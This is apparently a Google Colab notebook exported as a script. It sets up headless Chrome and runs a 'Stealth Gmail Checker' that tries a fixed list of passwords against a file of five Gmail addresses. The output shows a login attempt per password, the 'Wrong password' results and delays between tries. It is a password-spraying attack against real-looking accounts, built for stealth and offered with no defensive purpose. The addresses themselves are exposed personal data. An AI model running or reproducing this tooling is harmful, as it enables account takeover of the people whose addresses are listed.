# %% [markdown]
# <a href="https://colab.research.google.com/github/aladdin4220243/aass1122/blob/main/4_passwords.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %%
# %%writefile "gmail.txt"
# lylaclarke155@gmail.com
# gabrielcaleb113@gmail.com
# gabrielcaleb712@gmail.com
# britneykim502@gmail.com
# marcosjoseph945@gmail.com
# Out:
# Overwriting gmail.txt

# %%
# !git clone https://github.com/aladdin4220243/aass1122.git
# !pip install -r /content/aass1122/requirements.txt
# Out:
# fatal: destination path 'aass1122' already exists and is not an empty directory.
# ...

# %%
# !apt-get update -qq
# !wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
# !dpkg -i google-chrome-stable_current_amd64.deb
# !apt-get install -f -y -qq
# !apt-get install -y -qq xvfb 2>/dev/null | tail -n 2

# !pkill Xvfb 2>/dev/null; sleep 1
# !Xvfb :99 -screen 0 1920x1080x24 &>/dev/null &
# !export DISPLAY=:99

# !echo "Chrome: $(google-chrome-stable --version)"
# !echo "Display: $DISPLAY"
# Out:
# W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)
# --2026-07-30 18:30:46--  https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
# Resolving dl.google.com (dl.google.com)... 142.251.12.190, 142.251.12.91, 142.251.12.136, ...
# Connecting to dl.google.com (dl.google.com)|142.251.12.190|:443... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 139922812 (133M) [application/x-debian-package]
# Saving to: ‘google-chrome-stable_current_amd64.deb.1’
#
# google-chrome-stabl 100%[===================>] 133.44M   101MB/s    in 1.3s
#
# 2026-07-30 18:30:47 (101 MB/s) - ‘google-chrome-stable_current_amd64.deb.1’ saved [139922812/139922812]
#
# (Reading database ... 118669 files and directories currently installed.)
# Preparing to unpack google-chrome-stable_current_amd64.deb ...
# ...

# %%
# !python -u /content/aass1122/main.py
# Out:
# 🎯 Stealth Gmail Checker FINAL V5
# ⚠️  Need Xvfb: !Xvfb :99 -screen 0 1920x1080x24 &>/dev/null &
# 🔧 Initializing Gmail Checker (FINAL V5)...
# 📂 Loaded previous session
# ✅ Initialization complete
#
# ...
# 🚀 Starting Stealth Gmail Checker FINAL V5
# 🔑 Passwords: ['aass1122', 'Artisan@1200', 'sgsg1122', 'www421qqq']
# 📂 Accounts file: /content/orgenal folder/live/12345Noah Brookslive_accounts.txt
# ...
#
# 🔄 Cycle #1 @ 18:31:19
# ❌ File not found: /content/orgenal folder/live/12345Noah Brookslive_accounts.txt
# 📂 Using fallback: gmail.txt
# 📧 5 total, 3 done, 2 remaining
#   🔧 Launching browser...
#   🔧 Setting up stealth browser (FINAL V5)...
#   → Chrome: /usr/bin/google-chrome-stable
#   → Version: Google Chrome 151.0.7922.71
#   ✅ Stealth browser ready
#
# 🎯 [1/2] britneykim502@gmail.com
#    🌐 britneykim502@gmail.com | pass: aass... ❌ Wrong password
#    ⏳ 5s...
#    🌐 britneykim502@gmail.com | pass: Arti... ❌ Wrong password
#    ⏳ 6s...
# ...
